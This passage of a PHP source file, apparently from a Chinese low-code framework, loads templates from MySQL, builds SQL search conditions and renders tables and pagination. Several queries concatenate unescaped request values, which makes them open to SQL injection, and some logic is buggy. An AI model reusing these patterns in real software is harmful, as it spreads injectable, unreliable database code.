         $tdemo=str_replace("[clsp]",$kinfo[$kinfo["COLUMN"][$p]]["COLUMN_CLASSP"],$tdemo);      
      //"[keylen]","typetitle":"[keytt]","changeable":"[cable]","clstxt":"[clstxt]","jshow":"[jshow]","jpost":"[jpost]","classp":"[clsp]
        $fmktps=$fmktps.$tdemo.",";
        $fmtps=$fmtps.$kinfo[$kinfo["COLUMN"][$p]]["COLUMN_TPNM"].",";
        if (strpos("xx-".$kinfo[$kinfo["COLUMN"][$p]]["COLUMN_CLSTXT"],"key")>0){
          $extkx=$extkx.$kinfo["COLUMN"][$p]."clstxt,";
        };
    }    
  }  
  $fmktps=killlaststr($fmktps);  
  $fmtps=killlaststr($fmtps); 
  $extkx=killlaststr($extkx); 
  $ktpexc=$fmtb["keytpexc"];  
  if ($ktpexc!=""){
    $ktpq=qian($ktpexc,"|");
    $ktph=hou($ktpexc,"|");
    if (strpos($ktpq,",")>0){
      $ptktq=explode(",",$ktpq);
      $ptkth=explode(",",$ktph);
      $totkt=count($ptktq);
      for ($i=0;$i<$totkt;$i++){
        $fmktps=str_replace("\"".$ptktq[$i]."\"","\"".$ptkth[$i]."\"",$fmktps);
      }
    }else{
      $totkt=1;
      $fmktps=str_replace("\"".$ktpq."\"","\"".$ktph."\"",$fmktps);
    }
  }
  $dkexc=$fmtb["dkeyexc"];
  if ($dkexc!=""){
    $dkpq=qian($dkexc,"|");
    $dkph=hou($dkexc,"|");
    if (strpos($ktpq,",")>0){
      $ptdkq=explode(",",$dkpq);
      $ptdkh=explode(",",$dkph);
      $totdk=count($ptdkq);
      for ($i=0;$i<$totdk;$i++){
        $jstxt=str_replace("\"".$ptdkh[$i]."\"","\"".$ptdkq[$i]."\"",$jstxt);
        $fmktps=str_replace("\"".$ptdkh[$i]."\"","\"".$ptdkq[$i]."\"",$fmktps);
      }
    }else{
       $jstxt=str_replace("\"".$dkph."\"","\"".$dkpq."\"",$jstxt);
       $fmktps=str_replace("\"".$dkph."\"","\"".$dkpq."\"",$fmktps);
      $totdk=1;
    }
  }
  $jsrd=str_replace("[keyitem]",$fmktps,$jsrd);
  $jsrd=str_replace("[dataitem]",$jstxt,$jsrd);
  $jsrd=str_replace("[totrcd]",$totrcd,$jsrd);
  $jsrd=str_replace("[rtnbool]","true",$jsrd);
  $jsrd=str_replace("[tbnm]",$kinfo["TABLE"]["NAME"],$jsrd);
  $jsrd=str_replace("[ckies]",$fmtb["ckies"],$jsrd);
  $jsrd=str_replace("[sqlstr]",$fmtb["sqlstr"],$jsrd);
  if ($extkx!=""){
   $jsrd=str_replace("[tbkies]",$skeys.",".$extkx,$jsrd);
  }else{
    $jsrd=str_replace("[tbkies]",$skeys,$jsrd);
  }
  $jsrd=str_replace("[ktps]",$fmtps,$jsrd);
  return $jsrd;
}
function exchjson($json,$ktpexc,$dkexc){
  //$ktpexc    varchar,tinyint|string,int,$dkexc  id|SNO
  if ($ktpexc!=""){
    $ktpq=qian($ktpexc,"|");
    $ktph=hou($ktpexc,"|");
    if (strpos($ktpq,",")>0){
      $ptktq=explode(",",$ktpq);
      $ptkth=explode(",",$ktph);      
      for ($i=0;$i<$totkt;$i++){
        $json=str_replace("\"".$ptktq[$i]."\"","\"".$ptkth[$i]."\"",$json);
      }
    }else{      
      $json=str_replace("\"".$ktpq."\"","\"".$ktph."\"",$json);
    }
  }
  if ($dkexc!=""){
    $dkpq=qian($dkexc,"|");
    $dkph=hou($dkexc,"|");
    if (strpos($ktpq,",")>0){
      $ptdkq=explode(",",$dkpq);
      $ptdkh=explode(",",$dkph);
      for ($i=0;$i<$totdk;$i++){
        $json=str_replace("\"".$ptdkh[$i]."\"","\"".$ptdkq[$i]."\"",$json);        
      }
    }else{
       $json=str_replace("\"".$dkph."\"","\"".$dkpq."\"",$json);             
    }
  }
  return $json;
}
function shortcss($shortid,$stcss=array()){
  $conn=mysql_connect(gl(),glu(),glp());
  $contrst=selecteds($conn,glb(),"select jsfiles,cssfiles,scriptx,stylex,diybutton,diytop,diybottom,diyshow,bottombutton,expunit,sbtn,rbtn,dtshow,isexp from coode_shortcss where shortid='".$shortid."'","utf8","");  
  $stcss["shortid"]=$shortid;
  $stcss["jsfiles"]=tostring(anyvalue($contrst,"jsfiles",0));
  $stcss["cssfiles"]=tostring(anyvalue($contrst,"cssfiles",0));
  $stcss["scriptx"]=tostring(anyvalue($contrst,"scriptx",0));
  $stcss["stylex"]=tostring(anyvalue($contrst,"stylex",0));
  $stcss["diybutton"]=instance(tostring(anyvalue($contrst,"diybutton",0)));
  $stcss["diytop"]=instance(tostring(anyvalue($contrst,"diytop",0)));
  $stcss["diybottom"]=instance(tostring(anyvalue($contrst,"diybottom",0)));
  $stcss["diyshow"]=instance(tostring(anyvalue($contrst,"diyshow",0)));
  $stcss["bottombutton"]=instance(tostring(anyvalue($contrst,"bottombutton",0)));
  $stcss["expunit"]=instance(tostring(anyvalue($contrst,"expunit",0)));
  $stcss["sbtn"]=intval(tostring(anyvalue($contrst,"sbtn",0)))*1;
  $stcss["rbtn"]=intval(tostring(anyvalue($contrst,"rbtn",0)))*1;
  $stcss["dtshow"]=intval(tostring(anyvalue($contrst,"dtshow",0)))*1;
  $stcss["isexp"]=intval(tostring(anyvalue($contrst,"isexp",0)))*1;    
  return $stcss;
}
function pagecss($pageid,$stcss=array()){
  $conn=mysql_connect(gl(),glu(),glp());
  $contrst=selecteds($conn,glb(),"select jsfiles,cssfiles,scriptx,stylex from coode_compage where pageid='".$pageid."'","utf8","");  
  $stcss["pageid"]=$pageid;
  $stcss["jsfiles"]=tostring(anyvalue($contrst,"jsfiles",0));
  $stcss["cssfiles"]=tostring(anyvalue($contrst,"cssfiles",0));
  $stcss["scriptx"]=tostring(anyvalue($contrst,"scriptx",0));
  $stcss["stylex"]=tostring(anyvalue($contrst,"stylex",0));
  return $stcss;
}
 function caseinfo($caseid,$kcs=array()){
$conn=mysql_connect(gl(),glu(),glp());   
$contrst=selectedx($conn,glb(),"select SNO,cssfiles,jsfiles,stylex,scriptx,pagesrd,pagein,pageout,casevarchar,casethead,casephp,casetext,caseclstxt,caseclsduo,casedate,casedttm,caseint,casesrd,caserow,casedecimal,caseimage,caseimgx,casefile,caseduofile,casecheck,caseinline from coode_caseform where cfid='".$caseid."'","utf8","");//比较公私分离是否成功,展示比较用hcss2   
$kcs["caseid"]=$caseid;
   $kcs["cssfiles"]=tostring(anyvalue($contrst,"cssfiles",0));
   $kcs["jsfiles"]=tostring(anyvalue($contrst,"jsfiles",0));
   $kcs["stylex"]=tostring(anyvalue($contrst,"stylex",0));
   $kcs["scriptx"]=tostring(anyvalue($contrst,"scriptx",0));
$kcs["casehead"]=instance(tostring(anyvalue($contrst,"casethead",0)));
$kcs["varchar"]=instance(tostring(anyvalue($contrst,"casevarchar",0)));
$kcs["text"]=instance(tostring(anyvalue($contrst,"casetext",0)));
$kcs["tarea"]=instance(tostring(anyvalue($contrst,"casetext",0)));
$kcs["clstxt"]=instance(tostring(anyvalue($contrst,"caseclstxt",0)));
$kcs["clsduo"]=instance(tostring(anyvalue($contrst,"caseclsduo",0)));
$kcs["date"]=instance(tostring(anyvalue($contrst,"casedate",0)));
$kcs["dttm"]=instance(tostring(anyvalue($contrst,"casedttm",0)));
$kcs["int"]=instance(tostring(anyvalue($contrst,"caseint",0)));
$kcs["decimal"]=instance(tostring(anyvalue($contrst,"casedecimal",0)));
$kcs["image"]=instance(tostring(anyvalue($contrst,"caseimage",0)));
$kcs["imgx"]=instance(tostring(anyvalue($contrst,"caseimgx",0)));
$kcs["filex"]=instance(tostring(anyvalue($contrst,"casefile",0)));
$kcs["duofile"]=instance(tostring(anyvalue($contrst,"caseduofile",0)));
$kcs["check"]=instance(tostring(anyvalue($contrst,"casecheck",0)));
$kcs["inline"]=instance(tostring(anyvalue($contrst,"caseinline",0)));
$kcs["row"]=instance(tostring(anyvalue($contrst,"caserow",0)));     
$kcs["srd"]=instance(tostring(anyvalue($contrst,"casesrd",0)));  
$kcs["inline"]=instance(tostring(anyvalue($contrst,"caseinline",0)));
$kcs["pagesrd"]=instance(tostring(anyvalue($contrst,"pagesrd",0)));
$kcs["pagein"]=instance(tostring(anyvalue($contrst,"pagein",0)));  
$kcs["pageout"]=instance(tostring(anyvalue($contrst,"pageout",0)));
$kcs["php"]=tostring(anyvalue($contrst,"casephp",0));
return $kcs;
}
 function comcdt($pnum,$page,$skeyx,$cdtk,$odk,$allkx,$xkey,$xval){
   $ncdt="";
    if ($xkey!="" and $xval!=""){
    $ptxk=explode("/",$xkey);
    $totpx=count($ptxk);
    $fmccc="";
    $fmcdt="";
    if ($allkx=="@@@"){
      $ksx=1;
      $jsx=7;
    }
    if ($allkx==""){
      $ksx=0;
      $jsx=1;
    }
    for ($s=$ksx;$s<$jsx;$s++){      
      $tmpdd="";
      for ($t=0;$t<$totpx-1;$t++){
        $qkk=qian($ptxk[$t],":");
        $qtp=hou($ptxk[$t],":");
        switch ($qtp){
          case "varchar":
            if (qian(hou($xval,"q_".$qkk.$s.":"),"/")!=""){
              $tmpdd=$tmpdd." ".$qkk." like '%".qian(hou($xval,"q_".$qkk.$s.":"),"/")."%' and ";
            }
          break;
          case "text":
            if (qian(hou($xval,"q_".$qkk.$s.":"),"/")!=""){
              $tmpdd=$tmpdd." ".$qkk." like '%".qian(hou($xval,"q_".$qkk.$s.":"),"/")."%' and ";
            }
          break;
          case "date":
            if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!="" and qian(hou($xval,"qb_".$qkk.$s.":"),"/")!=""){
              $tmpdd=$tmpdd." timestampdiff(second,'".qian(hou($xval,"qa_".$qkk.$s.":"),"/")."',".$qkk.")>=0 and   timestampdiff(second,".$qkk.",'".qian(hou($xval,"qb_".$qkk.$s.":"),"/")."')>=0 and ";
            }else if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!=""){
              $tmpdd=$tmpdd." timestampdiff(second,'".qian(hou($xval,"qa_".$qkk.$s.":"),"/")."',".$qkk.")>=0  and ";
            }else{
              $tmpdd=$tmpdd." timestampdiff(second,".$qkk.",'".qian(hou($xval,"qb_".$qkk.$s.":"),"/")."')>=0 and ";
            }
          break;
         case "datetime":
            if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!="" and qian(hou($xval,"qb_".$qkk.$s.":"),"/")!=""){
              $tmpdd=$tmpdd." timestampdiff(second,'".qian(hou($xval,"qa_".$qkk.$s.":"),"/")."',".$qkk.")>=0 and   timestampdiff(second,".$qkk.",'".qian(hou($xval,"qb_".$qkk.$s.":"),"/")."')>=0 and ";
            }else if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!=""){
              $tmpdd=$tmpdd." timestampdiff(second,'".qian(hou($xval,"qa_".$qkk.$s.":"),"/")."',".$qkk.")>=0  and ";
            }else{
              $tmpdd=$tmpdd." timestampdiff(second,".$qkk.",'".qian(hou($xval,"qb_".$qkk.$s.":"),"/")."')>=0 and ";
            }
         break;
         case "tinyint":
            if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!="" and qian(hou($xval,"qb_".$qkk.$s.":"),"/")!=""){
              $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)." and ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
            }else if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!=""){
              $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)."  and ";
            }else{
              $tmpdd=$tmpdd." ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
            }
         break;
         case "int":
            if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!="" and qian(hou($xval,"qb_".$qkk.$s.":"),"/")!=""){
              $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)." and ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
            }else if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!=""){
              $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)."  and ";
            }else{
              $tmpdd=$tmpdd." ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
            }
         break; 
         case "decimal":
            if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!="" and qian(hou($xval,"qb_".$qkk.$s.":"),"/")!=""){
              $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)." and ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
            }else if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!=""){
              $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)."  and ";
            }else{
              $tmpdd=$tmpdd." ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
            }
         break;
         case "float":
            if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!="" and qian(hou($xval,"qb_".$qkk.$s.":"),"/")!=""){
              $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)." and ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
            }else if (qian(hou($xval,"qa_".$qkk.$s.":"),"/")!=""){
              $tmpdd=$tmpdd." ".$qkk.">=".(qian(hou($xval,"qa_".$qkk.$s.":"),"/")*1)."  and ";
            }else{
              $tmpdd=$tmpdd." ".$qkk."<=".(qian(hou($xval,"qb_".$qkk.$s.":"),"/")*1)." and ";
            }
         break;
          default:
            if (qian(hou($xval,"q_".$qkk.$s.":"),"/")!=""){
              $tmpdd=$tmpdd." ".$qkk." like '%".qian(hou($xval,"q_".$qkk.$s.":"),"/")."%' and ";
            }            
        }//swithch                
      }//for t    
      if ($tmpdd!=""){
        $tmpdd=substr($tmpdd,0,strlen($tmpdd)-4);
        $fmccc=$fmccc."(".$tmpdd.") or ";
      }else{
      }
    }//fors
        if ($fmccc!=""){
          $fmccc=substr($fmccc,0,strlen($fmccc)-4);
          $fmcdt=" and (".$fmccc.") ";                
        }else{
          $fmcdt="";                
        };    
  }
   $ncdt="";
   if ($allkx!=""){
     $fmcdt="";
     $fmak=" and ( concat(".$skeyx.") like '%".$allkx."%') ";
   }else{
     $fmak="";
   }
   $fmbdt="";
   if ( $pnum!="" and $page!="" ){
     if ($page*1==0){
       $page="1";
     }else{
       
     };
     if (strpos($pnum,":")>0 and strpos($page,":")>0){
        $pkeyx=hou($page,":");
        $pvalx=hou($pnum,":");
       if (substr($pkeyx,0,1)=="@"){
         $fmbdt=" and ".hou($pkeyx,"@")." like '%".$pvalx."%' ";
       }else{
         $fmbdt=" and ".$pkeyx."= '".$pvalx."' ";
       }       
     }
     $tmpspg=($page*1-1)*$pnum;
     $fmpgdt=" limit ".$tmpspg.",".$pnum;
   }else{
     $fmpgdt="";
   }
   if (str_replace(" ","",$cdtk)==""){     
     if ($fmak.$fmcdt!=""){
      $ncdt=hou($fmak.$fmbdt.$fmcdt.$odk.$fmpgdt," and ");
     }else{
      $ncdt=$odk.hou($fmbdt," and ").$fmpgdt;
     }
   }else{
    if ($fmak.$fmcdt!=""){
      $ncdt=" (".$cdtk.")  ".$fmak.$fmbdt.$fmcdt.$odk.$fmpgdt;
    }else{
      $ncdt=$cdtk.$fmbdt.$odk.$fmpgdt;
    }
   }

   return $ncdt;
 }
 function formtrow($trowx=array(),$kx,$vx,$tbsno,$tbolmk,$kyif,$stif,$jx,$srt){       
       $trowx["key"]=$kx;
       $trowx["ti"]=$jx;
       $trowx["ktitle"]=$kyif[$kx]["COLUMN_TITLE"];       
       if ($tbsno=="0"){
         $trowx["value"]=fmvalue($stif["tablename"],$srt[$kx][0],$tbsno,$kx,qian($kyif[$kx]["COLUMN_SSHOW"],"|"),$jx,$srt);
       }else{
         $trowx["value"]=fmvalue($stif["tablename"],$vx,$tbsno,$kx,qian($kyif[$kx]["COLUMN_SSHOW"],"|"),$jx,$srt);
       }
       $trowx["hvalue"]=String2Hex(tostring($vx));
       $trowx["key0"]=$kx.$tbsno;
       $trowx["thissno"]=$tbsno;
       $trowx["showkeys"]=$stif["showkeys"];
       $ptshowk=explode(",",$stif["showkeys"]);
       $totpt=count($ptshowk);
       $tj=0;
       for ($z=0;$z<$totpt;$z++){
         if ($ptshowk[$z]==$kx){
           $tj=$z+1;
         };
       };
       $trowx["tj"]=$tj;
       $trowx["tablename"]=$stif["tablename"];
       $trowx["shortid"]=$stif["shortid"];
       $trowx["dxtype"]=$kyif[$kx]["COLUMN_DXTYPE"]; 
       $trowx["acthtml"]=fmvalue($stif["tablename"],$vx,$tbsno,$kx,$kyif[$kx]["COLUMN_ACTHTM"],$jx,$srt);
       $trowx["atnhtml"]=fmvalue($stif["tablename"],$vx,$tbsno,$kx,$kyif[$kx]["COLUMN_ATNHTM"],$jx,$srt);   
       if ($kyif[$kx]["COLUMN_DSPLD"]*1==0 and $kyif[$kx]["COLUMN_DSPLD"]!=""){
         $trowx["dsplhtml"]="display:none;";
       }else{
         $trowx["dsplhtml"]="";
       }   
       if ($kyif[$kx]["COLUMN_CANGE"]*1==0 and $kyif[$kx]["COLUMN_CANGE"]!=""){
         $trowx["rdolhtml"]="readonly";       
       }else{
         $trowx["rdolhtml"]="";  
       }
       $trowx["thisolmk"]=$tbolmk;
      return $trowx;     
 }
 function combinecss($shortid,$anycss=array()){
   $oldmd5=md5($_POST[$shortid."_stylex"].$_POST[$shortid."_scriptx"].$_POST[$shortid."_cssfiles"].$_POST[$shortid."_jsfiles"]);
   $_POST[$shortid."_stylex"]=$_POST[$shortid."_stylex"].tostring($anycss["stylex"]);
   $_POST[$shortid."_scriptx"]=$_POST[$shortid."_scriptx"].tostring($anycss["scriptx"]);
   $_POST[$shortid."_cssfiles"]=$_POST[$shortid."_cssfiles"].tostring($anycss["cssfiles"]);
   $_POST[$shortid."_jsfiles"]=$_POST[$shortid."_jsfiles"].tostring($anycss["jsfiles"]);
   $newmd5=md5($_POST[$shortid."_stylex"].$_POST[$shortid."_scriptx"].$_POST[$shortid."_cssfiles"].$_POST[$shortid."_jsfiles"]);
   if ($newmd5!=$oldmd5){
     return true;
   }else{
     return false;
   }
 }
 function maketbhead($skeyx,$kxif=array(array()),$cxif=array(),$stxy=array()){
     $headstr=$cxif["casehead"];   
     $shokx=$skeyx;
     $srst=array(array());
     $partkx=explode(",",$shokx);
     $totptkx=count($partkx);
     $trtr=$cxif["inline"];
     $fmtd="";
     for ($mx=0;$mx<$totptkx;$mx++){
       $tdvl=$kxif[$partkx[$mx]]["COLUMN_TITLE"]==""?$partkx[$mx]:$kxif[$partkx[$mx]]["COLUMN_TITLE"];
       $tdxx=array();
       $tdxx=formtrow($tdxx,$partkx[$mx],$tdvl,"-1","-1",$kxif,$stxy,-1,$srst);
       $maketdv=exchangeunit($tdxx,$cxif["casehead"]);
       $fmtd=$fmtd.$maketdv;
     }  
    $trtr=str_replace("[inline]",$fmtd,$trtr);
   return $trtr;
 }
 function makedetail($srdhtm,$tbhd,$pghtm,$trhtm,$stb=array(),$std=array()){
   $fmtable="";   
   $btnhtm=array();
   $dsplnone="display:none;";//如果用STYLE的话，脚本里再有 STYLE会冲突          
   $fmtable=str_replace("{srdinner}",$trhtm,$srdhtm);
   $fmtable=str_replace("{expunit}",$tbhd,$fmtable);
   //$fmtable=str_replace("[pagehtm]",$pghtm,$fmtable);      
   $btnhtm["additemxdspl"]=$stb["additemx"]==0?$dsplnone:"";
   $btnhtm["newbuttondspl"]=$stb["newbutton"]==0?$dsplnone:"";
   $btnhtm["obtndspl"]=$stb["obtn"]==0?$dsplnone:"";
   $btnhtm["vbtndspl"]=$stb["vbtn"]==0?$dsplnone:"";
   $btnhtm["xbtndspl"]=$stb["xbtn"]==0?$dsplnone:"";
   $btnhtm["oprtxdspl"]=$stb["oprtx"]==0?$dsplnone:"";
   $btnhtm["topbtndspl"]=$stb["topbtn"]==0?$dsplnone:"";
   $btnhtm["bottombtndspl"]=$stb["bottombtn"]==0?$dsplnone:"";
   $btnhtm["spsdspl"]=$stb["sps"]==0?$dsplnone:""; 
   $btnhtm["allkillbtndspl"]=$stb["allkillbtn"]==0?$dsplnone:"";
   $btnhtm["sbtndspl"]=$std["sbtn"]==0?$dsplnone:"";
   $btnhtm["rbtndspl"]=$std["rbtn"]==0?$dsplnone:"";
   $btnhtm["dtshowdspl"]=$std["dtshow"]==0?$dsplnone:""; 
   $btnhtm["isexpdspl"]=$std["isexpdspl"]==0?$dsplnone:"";   
   $fmtable=str_replace("{tablename}",$stb["tablename"],$fmtable);
   $fmtable=str_replace("{shortid}",$stb["shortid"],$fmtable);
   $fmtable=str_replace("{makecdt}",$stb["makecdt"],$fmtable);
   $fmtable=str_replace("{allcdt}",$stb["allcdt"],$fmtable);
   $fmtable=str_replace("{shorttitle}",$stb["shorttitle"],$fmtable);  
   $fmtable=str_replace("{asc}",$stb["asc"],$fmtable);  
   $fmtable=str_replace("{xkey}",$stb["xkey"],$fmtable);  
   $fmtable=str_replace("{xval}",$stb["xval"],$fmtable);  
   $fmtable=str_replace("{diybutton}",$std["diybutton"],$fmtable);
   $fmtable=str_replace("{diytop}",$std["diytop"],$fmtable);
   $fmtable=str_replace("{bottombutton}",$std["bottombutton"],$fmtable);  
   $fmtable=str_replace("{diybottom}",$std["diybottom"],$fmtable);  
   $fmtable=str_replace("{diyshow}",$std["diyshow"],$fmtable);  
   $fmtable=str_replace("{expunit}",$std["expunit"],$fmtable);  
   $fmtable=str_replace("{additemxdspl}",$btnhtm["additemxdspl"],$fmtable);  
   $fmtable=str_replace("{newbuttondspl}",$btnhtm["newbuttondspl"],$fmtable);  
   $fmtable=str_replace("{obtndspl}",$btnhtm["obtndspl"],$fmtable);  
   $fmtable=str_replace("{vbtndspl}",$btnhtm["vbtndspl"],$fmtable);  
   $fmtable=str_replace("{xbtndspl}",$btnhtm["xbtndspl"],$fmtable);  
   $fmtable=str_replace("{oprtxdspl}",$btnhtm["oprtxdspl"],$fmtable);  
   $fmtable=str_replace("{topbtndspl}",$btnhtm["topbtndspl"],$fmtable);  
   $fmtable=str_replace("{bottombtndspl}",$btnhtm["bottombtndspl"],$fmtable);  
   $fmtable=str_replace("{spsdspl}",$btnhtm["spsdspl"],$fmtable);  
   $fmtable=str_replace("{allkillbtndspl}",$btnhtm["allkillbtndspl"],$fmtable);     
   $fmtable=str_replace("{sbtndspl}",$btnhtm["sbtndspl"],$fmtable);  
   $fmtable=str_replace("{rbtndspl}",$btnhtm["rbtndspl"],$fmtable);  
   $fmtable=str_replace("{dtshowdspl}",$btnhtm["dtshowdspl"],$fmtable);  
   $fmtable=str_replace("{isexpdspl}",$btnhtm["isexpdspl"],$fmtable);     
   $tinytxt=tinyhtml();
   $tinytxt=str_replace("{bodyx}",$fmtable,$tinytxt);
   return $tinytxt;
 }
 function maketable($srdhtm,$tbhd,$pghtm,$trhtm,$stb=array()){//pagehtm是页码
   $fmtable="";   
   $btnhtm=array();
   $dsplnone="display:none;";//如果用STYLE的话，脚本里再有 STYLE会冲突  
   $fmtable=$stb["tbhd"]==1?$fmtable."<thead>".$tbhd."</thead>":$fmtable;
   $fmtable=$stb["dtx"]==1?$fmtable."<tbody>".$trhtm."</tbody>":$fmtable;
   $fmtable=str_replace("{srdinner}",$fmtable,$srdhtm);
   $fmtable=str_replace("{pagehtm}",$pghtm,$fmtable);      
   $btnhtm["additemxdspl"]=$stb["additemx"]==0?$dsplnone:"";
   $btnhtm["newbuttondspl"]=$stb["newbutton"]==0?$dsplnone:"";
   $btnhtm["obtndspl"]=$stb["obtn"]==0?$dsplnone:"";
   $btnhtm["vbtndspl"]=$stb["vbtn"]==0?$dsplnone:"";
   $btnhtm["xbtndspl"]=$stb["xbtn"]==0?$dsplnone:"";
   $btnhtm["oprtxdspl"]=$stb["oprtx"]==0?$dsplnone:"";
   $btnhtm["topbtndspl"]=$stb["topbtn"]==0?$dsplnone:"";
   $btnhtm["bottombtndspl"]=$stb["bottombtn"]==0?$dsplnone:"";
   $btnhtm["spsdspl"]=$stb["sps"]==0?$dsplnone:""; 
   $btnhtm["allkillbtndspl"]=$stb["allkillbtn"]==0?$dsplnone:"";
   $fmtable=str_replace("{tablename}",$stb["tablename"],$fmtable);
   $fmtable=str_replace("{shortid}",$stb["shortid"],$fmtable);
   $fmtable=str_replace("{makecdt}",$stb["makecdt"],$fmtable);
   $fmtable=str_replace("{allcdt}",$stb["allcdt"],$fmtable);
   $fmtable=str_replace("{pnum}",$stb["pnum"],$fmtable);
   $fmtable=str_replace("{page}",$stb["page"],$fmtable);   
   $fmtable=str_replace("{diytop}",$stb["diytop"],$fmtable);
   $fmtable=str_replace("{diybottom}",$stb["diybottom"],$fmtable);
   $fmtable=str_replace("{headx}",$stb["headx"],$fmtable);
   $fmtable=str_replace("{diycode}",$stb["diycode"],$fmtable);
   $fmtable=str_replace("{shorttitle}",$stb["shorttitle"],$fmtable);  
   $fmtable=str_replace("{asc}",$stb["asc"],$fmtable);  
   $fmtable=str_replace("{xkey}",$stb["xkey"],$fmtable);  
   $fmtable=str_replace("{xval}",$stb["xval"],$fmtable);  
   $fmtable=str_replace("{additemxdspl}",$btnhtm["additemxdspl"],$fmtable);  
   $fmtable=str_replace("{newbuttondspl}",$btnhtm["newbuttondspl"],$fmtable);  
   $fmtable=str_replace("{obtndspl}",$btnhtm["obtndspl"],$fmtable);  
   $fmtable=str_replace("{vbtndspl}",$btnhtm["vbtndspl"],$fmtable);  
   $fmtable=str_replace("{xbtndspl}",$btnhtm["xbtndspl"],$fmtable);  
   $fmtable=str_replace("{oprtxdspl}",$btnhtm["oprtxdspl"],$fmtable);  
   $fmtable=str_replace("{topbtndspl}",$btnhtm["topbtndspl"],$fmtable);  
   $fmtable=str_replace("{bottombtndspl}",$btnhtm["bottombtndspl"],$fmtable);  
   $fmtable=str_replace("{spsdspl}",$btnhtm["spsdspl"],$fmtable);  
   $fmtable=str_replace("{allkillbtndspl}",$btnhtm["allkillbtndspl"],$fmtable);     
   $tinytxt=tinyhtml();
   $tinytxt=str_replace("{bodyx}",$fmtable,$tinytxt);
   return $tinytxt;
 }
function makepagerow($pnum,$pg,$atot,$stid,$cinfo=array(),$asc,$xky,$xvy){
  if ($pnum!="" and $pnum!="un"+"defined" and $pg!="" and $pg!="un"+"defined"){    
    $radius=7;
    $pagesrdx=$cinfo["pagesrd"];    
    $pageinx=$cinfo["pagein"];
    $pageoutx=$cinfo["pageout"];
    $pageinx=str_replace("{page}",$pg,$pageinx);
    $pageinx=str_replace("{asc}",$asc,$pageinx);
    $pageinx=str_replace("{xkey}",$xky,$pageinx);
    $pageinx=str_replace("{xval}",$xvy,$pageinx);
    $pageinx=str_replace("{pgtt}","第".$pg."页",$pageinx);
    $totpage=ceil($atot/$pnum);
    $endpg=($pg*1)+$radius;
    $startpg=($pg-$radius)-($endpg-$totpage);
    if ($endpg>$totpage){
      $endpage=$totpage;
    }else{
      $endpage=$endpg;
    };
    if ($startpg<1){
      $startpage=1; 
    }else{
      $startpage=$startpg;
    };
    $fminner="";
    $fmqk="";
    $fmhv="";    
    for ($px=$startpage;$px<$endpage+1;$px++){
      if ($pg!=$px){
       $pout=$pageoutx;    
       $pout=str_replace("{page}",$px,$pout);
       $pout=str_replace("{pgtt}","第".$px."页",$pout);
       $pout=str_replace("{asc}",$asc,$pout);
       $pout=str_replace("{xkey}",$xky,$pout);
       $pout=str_replace("{xval}",$xvy,$pout);
       $fmqk=$fmqk."第".$px."页,";
       $fmhv=$fmhv.$px.",";
       $fminner=$fminner.$pout;      
      }else{
         $fminner=$fminner.$pageinx;
      };//if
    }//for
    if ($totpage>0){
      $fmqk=substr($fmqk,0,strlen($fmqk)-1);
      $fmhv=substr($fmhv,0,strlen($fmhv)-1);
    };
   $xsslt="每页显示30条,每页显示50条,每页显示100条,每页显示150条,每页显示200条,每页显示300条,显示所有记录";
   $xsslv="30,50,100,150,200,300,0";
   $fmselectjs=formselect($fmqk,$fmhv,$pg,"topage","layui-select","onchange=\"tospage($(this).value);\"");
   $fmselectpn=formselect($xsslt,$xsslv,$pg,"topn","layui-select","onchange=\"setpage($(this).value);\"");
    $pagesrdx=str_replace("{asc}",$asc,$pagesrdx);
    $pagesrdx=str_replace("{xkey}",$xky,$pagesrdx);
    $pagesrdx=str_replace("{xval}",$xvy,$pagesrdx);  
    $pagesrdx=str_replace("{pagenum}",$pnum,$pagesrdx);    
    $pagesrdx=str_replace("{prepage}",$pg,$pagesrdx);    
   $pagesrdx=str_replace("{pgselect}",$fmselectjs,$pagesrdx);
   $pagesrdx=str_replace("{pgnum}",$fmselectpn,$pagesrdx);
   $pagesrdx=str_replace("{pageend}",$totpage,$pagesrdx);
    $pagesrdx=str_replace("{pagetot}",$totpage,$pagesrdx);
   $pagesrdx=str_replace("{pett}","尾页",$pagesrdx);
   $pagesrdx=str_replace("{pageinner}",$fminner,$pagesrdx);
  }else{
   $pagesrdx="";
  }      
  return $pagesrdx;
}//fun
 function anydetail($itab=array()){
     //need shortid,pgnum,page,caseid,allsearch/presc,cssmk,denykey,denypmtarea,appid,dbinfo,   页面的cssmk也要吧，作为重要补充，  方法的美丽；要向数学函数一样简练 应存 已存 应展示 已展示 应（进/退），各种参数值模拟基因键位，结构有参，数据有参，展示位置，存储位置，基因肯定有更高层的控制机制，然后下面自动去实现，每一次选择都有这两项，让你自己选为了适应你的当次状况。类的使用是控制一叶拥有整片森林
